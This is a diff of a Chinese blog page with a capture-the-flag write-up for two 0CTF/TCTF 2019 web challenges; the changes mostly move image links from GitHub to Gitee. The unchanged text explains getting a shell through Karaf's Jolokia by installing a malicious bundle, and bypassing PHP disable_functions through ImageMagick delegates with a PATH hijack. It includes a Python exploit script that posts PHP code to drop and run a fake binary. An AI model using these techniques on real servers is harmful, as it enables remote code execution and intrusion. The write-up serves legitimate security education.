@@ -6,29 +6,29 @@
   <title>0CTF/TCTF2019 Web题解 | Twings</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="前言这次的CTF比赛虽然只有两道Web题，但是难度还是有的，用到的知识点也很有趣，而菜鸡的我在群内大师傅的提点下总算是把题目给做出来了，这里总结一下。">
-<meta name="keywords" content="Web,CTF">
+<meta name="keywords" content="CTF,Web">
 <meta property="og:type" content="article">
 <meta property="og:title" content="0CTF&#x2F;TCTF2019 Web题解">
 <meta property="og:url" content="http://yoursite.com/2019/03/26/0CTF-TCTF-Web题解/index.html">
 <meta property="og:site_name" content="Twings">
 <meta property="og:description" content="前言这次的CTF比赛虽然只有两道Web题，但是难度还是有的，用到的知识点也很有趣，而菜鸡的我在群内大师傅的提点下总算是把题目给做出来了，这里总结一下。">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/0CTF2019/2019032604.png?raw=true">
-<meta property="og:image" content="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/0CTF2019/2019032602.png?raw=true">
-<meta property="og:image" content="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/0CTF2019/2019032603.png?raw=true">
-<meta property="og:image" content="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/0CTF2019/2019032605.png?raw=true">
-<meta property="og:image" content="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/0CTF2019/2019032606.png?raw=true">
-<meta property="og:image" content="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/0CTF2019/2019032607.png?raw=true">
-<meta property="og:image" content="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/0CTF2019/2019032601.png?raw=true">
-<meta property="og:image" content="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/0CTF2019/2019032608.png?raw=true">
-<meta property="og:image" content="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/0CTF2019/2019032609.png?raw=true">
-<meta property="og:image" content="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/0CTF2019/2019032610.png?raw=true">
-<meta property="og:image" content="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/0CTF2019/2019032611.png?raw=true">
-<meta property="og:updated_time" content="2019-03-28T13:00:47.369Z">
+<meta property="og:image" content="https://gitee.com/Aluvion/Aluvion/raw/master/css/images/0CTF2019/2019032604.png?raw=true">
+<meta property="og:image" content="https://gitee.com/Aluvion/Aluvion/raw/master/css/images/0CTF2019/2019032602.png?raw=true">
+<meta property="og:image" content="https://gitee.com/Aluvion/Aluvion/raw/master/css/images/0CTF2019/2019032603.png?raw=true">
+<meta property="og:image" content="https://gitee.com/Aluvion/Aluvion/raw/master/css/images/0CTF2019/2019032605.png?raw=true">
+<meta property="og:image" content="https://gitee.com/Aluvion/Aluvion/raw/master/css/images/0CTF2019/2019032606.png?raw=true">
+<meta property="og:image" content="https://gitee.com/Aluvion/Aluvion/raw/master/css/images/0CTF2019/2019032607.png?raw=true">
+<meta property="og:image" content="https://gitee.com/Aluvion/Aluvion/raw/master/css/images/0CTF2019/2019032601.png?raw=true">
+<meta property="og:image" content="https://gitee.com/Aluvion/Aluvion/raw/master/css/images/0CTF2019/2019032608.png?raw=true">
+<meta property="og:image" content="https://gitee.com/Aluvion/Aluvion/raw/master/css/images/0CTF2019/2019032609.png?raw=true">
+<meta property="og:image" content="https://gitee.com/Aluvion/Aluvion/raw/master/css/images/0CTF2019/2019032610.png?raw=true">
+<meta property="og:image" content="https://gitee.com/Aluvion/Aluvion/raw/master/css/images/0CTF2019/2019032611.png?raw=true">
+<meta property="og:updated_time" content="2020-03-15T11:33:09.662Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="0CTF&#x2F;TCTF2019 Web题解">
 <meta name="twitter:description" content="前言这次的CTF比赛虽然只有两道Web题，但是难度还是有的，用到的知识点也很有趣，而菜鸡的我在群内大师傅的提点下总算是把题目给做出来了，这里总结一下。">
-<meta name="twitter:image" content="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/0CTF2019/2019032604.png?raw=true">
+<meta name="twitter:image" content="https://gitee.com/Aluvion/Aluvion/raw/master/css/images/0CTF2019/2019032604.png?raw=true">
   
     <link rel="alternate" href="/atom.xml" title="Twings" type="application/atom+xml">
   
@@ -51,7 +51,7 @@
         <div class="widget-wrap mobile-header">
   <h3 class="widget-title"></h3>
   <div class="widget">
-    <img class="avatar" src="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/31733328.jfif?raw=true">
+    <img class="avatar" src="https://gitee.com/Aluvion/Aluvion/raw/master/css/images/avatar.png">
     <h2 class="author">Aluvion</h2>
     <h3 class="description">摸鱼</h3>
     <div class="count-box">
@@ -128,7 +128,7 @@
 <p>更多的解法：<a href="https://xz.aliyun.com/t/4590#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/4590#toc-1</a></p>
 <p>看来Karaf中的功能还是很多的，可以利用的点也很多。</p>
 <p>接下来我们需要知道访问接口时所需要的参数，我们下载源码进行审计，在apache-karaf-4.2.4\bundle\core\src\main\java\org\apache\karaf\bundle\core\internal\BundlesMBeanImpl.java中可以看到：</p>
-<p><img src="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/0CTF2019/2019032604.png?raw=true" alt=""></p>
+<p><img src="https://gitee.com/Aluvion/Aluvion/raw/master/css/images/0CTF2019/2019032604.png?raw=true" alt=""></p>
 <p>在start bundle的时候会调用它的start函数，所以我们可以编写一个恶意的bundle，在里面实现一个恶意的start方法，然后向服务端POST JSON数据，让服务端安装我们的恶意bundle并执行里面的start方法，就可以getshell了。</p>
 <p>或者也可以像这一篇文章一样，直接调用两个参数的install方法，一步到位：<a href="https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#ghost-pepper" target="_blank" rel="noopener">https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#ghost-pepper</a></p>
 <h4 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h4><ul>
@@ -136,33 +136,33 @@
 </li>
 <li><p>访问jolokia/list得到可以访问的MBean</p>
 </li>
-<li><p>由于提示karaf的原因，将关注点放在karaf上面，可以看到我们能够访问bundle的install和start，当然也可以郁离歌师傅那样，直接调用feature（feature在Karaf中可以用来安装各种工具，安装Jolokia用的就是这个）安装一个webconsole，然后执行命令。<br><img src="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/0CTF2019/2019032602.png?raw=true" alt=""></p>
+<li><p>由于提示karaf的原因，将关注点放在karaf上面，可以看到我们能够访问bundle的install和start，当然也可以郁离歌师傅那样，直接调用feature（feature在Karaf中可以用来安装各种工具，安装Jolokia用的就是这个）安装一个webconsole，然后执行命令。<br><img src="https://gitee.com/Aluvion/Aluvion/raw/master/css/images/0CTF2019/2019032602.png?raw=true" alt=""></p>
 </li>
 </ul>
 <ul>
-<li>然后我们使用IDEA来制作一个恶意bundle，具体流程看这里：<a href="https://blog.csdn.net/Love_Taylor/article/details/75194394" target="_blank" rel="noopener">https://blog.csdn.net/Love_Taylor/article/details/75194394</a><br><img src="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/0CTF2019/2019032603.png?raw=true" alt=""></li>
+<li>然后我们使用IDEA来制作一个恶意bundle，具体流程看这里：<a href="https://blog.csdn.net/Love_Taylor/article/details/75194394" target="_blank" rel="noopener">https://blog.csdn.net/Love_Taylor/article/details/75194394</a><br><img src="https://gitee.com/Aluvion/Aluvion/raw/master/css/images/0CTF2019/2019032603.png?raw=true" alt=""></li>
 </ul>
 <ul>
 <li><p>将恶意bundle打包成jar文件，然后放到我们的VPS上面。</p>
 </li>
-<li><p>向服务端POST JSON数据，install我们的恶意bundle<br><img src="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/0CTF2019/2019032605.png?raw=true" alt=""></p>
+<li><p>向服务端POST JSON数据，install我们的恶意bundle<br><img src="https://gitee.com/Aluvion/Aluvion/raw/master/css/images/0CTF2019/2019032605.png?raw=true" alt=""></p>
 </li>
 </ul>
 <p>  从第一个返回包中拿到bundleId，然后POST第二个包，start我们的恶意bundle</p>
-<p><img src="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/0CTF2019/2019032606.png?raw=true" alt=""></p>
-<p>  getshell<br><img src="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/0CTF2019/2019032607.png?raw=true" alt=""></p>
+<p><img src="https://gitee.com/Aluvion/Aluvion/raw/master/css/images/0CTF2019/2019032606.png?raw=true" alt=""></p>
+<p>  getshell<br><img src="https://gitee.com/Aluvion/Aluvion/raw/master/css/images/0CTF2019/2019032607.png?raw=true" alt=""></p>
 <h4 id="本地环境搭建"><a href="#本地环境搭建" class="headerlink" title="本地环境搭建"></a>本地环境搭建</h4><p>我使用的环境是docker搭建的Ubuntu18.04，Karaf可以去它的官网进行下载：<a href="http://karaf.apache.org/download.html" target="_blank" rel="noopener">http://karaf.apache.org/download.html</a></p>
 <p>要注意的是Karaf的各个版本对Java版本的支持不一，我下载的是Karaf Runtime 4.1.7的版本，然后：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install openjdk-8-jdk # 安装jdk8</span><br><span class="line">tar xvf apache-karaf-4.1.7.tar.gz # 解包</span><br></pre></td></tr></table></figure>
 <p>在Karaf中安装Jolokia的方式可以看这里：<a href="https://karaf.apache.org/manual/latest/#_jmx_http_bridge_with_jolokia" target="_blank" rel="noopener">https://karaf.apache.org/manual/latest/#_jmx_http_bridge_with_jolokia</a> ，这样搭建起来的就跟题目基本一样了，MBean的数量也差不多，访问时候的验证可以用karaf/karaf的默认账号密码，验证通过就有了管理员权限，就可以为所欲为了（比如安装webconsole）。</p>
 <p>如果安装失败也可以看看其他版本的手册，比如<a href="https://karaf.apache.org/manual/latest-3.0.x/monitoring" target="_blank" rel="noopener">https://karaf.apache.org/manual/latest-3.0.x/monitoring</a> ，这种方法跟上一种不同的是访问Jolokia没有账号密码的验证（如果要访问webconsole才需要验证），环境和题目稍有不同，可以访问的MBean要少一些，不过不影响解题。</p>
 <p>这样看来webconsole可能像是个非预期解？访问8181端口就可以看到环境成功地搭建起来了：</p>
-<p><img src="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/0CTF2019/2019032601.png?raw=true" alt=""></p>
+<p><img src="https://gitee.com/Aluvion/Aluvion/raw/master/css/images/0CTF2019/2019032601.png?raw=true" alt=""></p>
 <hr>
 <h3 id="Wallbreaker-Easy"><a href="#Wallbreaker-Easy" class="headerlink" title="Wallbreaker Easy"></a>Wallbreaker Easy</h3><p>题目地址：<a href="http://111.186.63.208:31340/" target="_blank" rel="noopener">http://111.186.63.208:31340/</a></p>
 <h4 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h4><p>按照题目的提示，流程就是利用ImageMagick的漏洞绕过PHP的disable_functions，来执行根目录下的readflag程序。题目除了disable_functions之外还做了open_basedir的限制：</p>
-<p><img src="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/0CTF2019/2019032608.png?raw=true" alt=""></p>
-<p><img src="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/0CTF2019/2019032609.png?raw=true" alt=""></p>
+<p><img src="https://gitee.com/Aluvion/Aluvion/raw/master/css/images/0CTF2019/2019032608.png?raw=true" alt=""></p>
+<p><img src="https://gitee.com/Aluvion/Aluvion/raw/master/css/images/0CTF2019/2019032609.png?raw=true" alt=""></p>
 <p>在寻找漏洞之前，我们可以先看一下16年的ImageMagick漏洞详情：<a href="https://www.2cto.com/article/201605/505823.html" target="_blank" rel="noopener">https://www.2cto.com/article/201605/505823.html</a></p>
 <p>漏洞原因是ImageMagick在处理文件的时候，底层会使用system或者execve调用相应的二进制程序来实现功能，而因为对输入变量的处理不够妥善，就导致了命令注入漏洞。新版本的ImageMagick则通过两种或更多的方式来修复了：禁止了一些delegate、在处理输入输出前先创建随机文件名的文件副本。</p>
 <p>现在命令注入是行不通了，但是还有一个问题，观察delegate的command，ImageMagick在调用二进制文件的时候，似乎没有写上他们的绝对路径？我们选用第一个delegate（delegate decode=”bpg” command=”&quot;@BPGDecodeDelegate@&quot; -b 16 -o &quot;%o.png&quot; &quot;%i&quot;; @MVDelegate@ &quot;%o.png&quot; &quot;%o&quot;”），用strace调试一下看看，命令：</p>
@@ -177,7 +177,7 @@
 <p>Twings.php：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">putenv(&quot;PATH=/tmp&quot;);</span><br><span class="line">$image = new Imagick(&apos;Sun.bpg&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <p>运行php Twings.php，可以看到：</p>
-<p><img src="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/0CTF2019/2019032610.png?raw=true" alt=""></p>
+<p><img src="https://gitee.com/Aluvion/Aluvion/raw/master/css/images/0CTF2019/2019032610.png?raw=true" alt=""></p>
 <p>成功了！</p>
 <p>更多的解法，利用LD_PRELOAD环境变量+调用execve的PHP函数：</p>
 <p><a href="https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#wallbreaker-easy" target="_blank" rel="noopener">https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#wallbreaker-easy</a></p>
@@ -188,7 +188,7 @@
 <h4 id="解题流程-1"><a href="#解题流程-1" class="headerlink" title="解题流程"></a>解题流程</h4><p>直接贴脚本，我使用的是第二个delegate（delegate decode=”png” encode=”bpg” command=”&quot;@BPGEncodeDelegate@&quot; -b 12 -sstdout=%%stderr &quot;%Q&quot; -o &quot;%o&quot; &quot;%i&quot;”），即调用了bpgenc的delegate：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*-</span><br><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://111.186.63.208:31340/&quot;</span><br><span class="line">evil = open(&quot;bpgenc&quot;, &quot;rb&quot;).read()</span><br><span class="line">evil = base64.b64encode(evil)</span><br><span class="line">php = &quot;putenv(&apos;PATH=/tmp/40f955f039eabe222958ff57ac1bfdbb&apos;);&quot; \</span><br><span class="line">      &quot;file_put_contents(&apos;/tmp/40f955f039eabe222958ff57ac1bfdbb/bpgenc&apos;, base64_decode(&apos;&quot; + evil + &quot;&apos;));&quot; \</span><br><span class="line">      &quot;chmod(&apos;/tmp/40f955f039eabe222958ff57ac1bfdbb/bpgenc&apos;, 0777);&quot; \</span><br><span class="line">      &quot;$image = new Imagick(&apos;http://*.*.*.*/sun.png&apos;);&quot; \</span><br><span class="line">      &quot;$image -&gt; writeImage(&apos;/tmp/40f955f039eabe222958ff57ac1bfdbb/a.bpg&apos;);&quot; \</span><br><span class="line">      &quot;echo file_get_contents(&apos;/tmp/40f955f039eabe222958ff57ac1bfdbb/Pwn&apos;);&quot;</span><br><span class="line">data = &#123;</span><br><span class="line">    &quot;backdoor&quot;: php</span><br><span class="line">&#125;</span><br><span class="line">print requests.post(url, data=data).content</span><br></pre></td></tr></table></figure>
 <p>结果：</p>
-<p><img src="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/0CTF2019/2019032611.png?raw=true" alt=""></p>
+<p><img src="https://gitee.com/Aluvion/Aluvion/raw/master/css/images/0CTF2019/2019032611.png?raw=true" alt=""></p>
 <h4 id="本地环境搭建-1"><a href="#本地环境搭建-1" class="headerlink" title="本地环境搭建"></a>本地环境搭建</h4><p>同样的docker+Ubuntu18.04，因为要进行调试的原因，所以我使用了–security-opt参数：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -id --name php --security-opt seccomp=unconfined -p 32770:80 ubuntu</span><br></pre></td></tr></table></figure>
 <p>apt装好就完事了：</p>
@@ -206,7 +206,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/03/26/0CTF-TCTF-Web题解/" data-id="ck7sij7kz001jh8v6zqzg90jl" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2019/03/26/0CTF-TCTF-Web题解/" data-id="ck7syqpya0005i0v6q5vh1442" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
@@ -274,7 +274,7 @@
     <div class="widget-wrap">
   <h3 class="widget-title"></h3>
   <div class="widget">
-    <img class="avatar" src="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/31733328.jfif?raw=true">
+    <img class="avatar" src="https://gitee.com/Aluvion/Aluvion/raw/master/css/images/avatar.png">
     <h2 class="author">Aluvion</h2>
     <h3 class="description">摸鱼</h3>
     <div class="count-box">
@@ -286,6 +286,10 @@
 
 
     <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="https://gitee.com/Aluvion" target="_blank" title="Gitee">
+          Gitee
+        </a>
       
         <a class="hvr-bounce-in" href="https://github.com/Aluvion" target="_blank" title="Github">
           Github
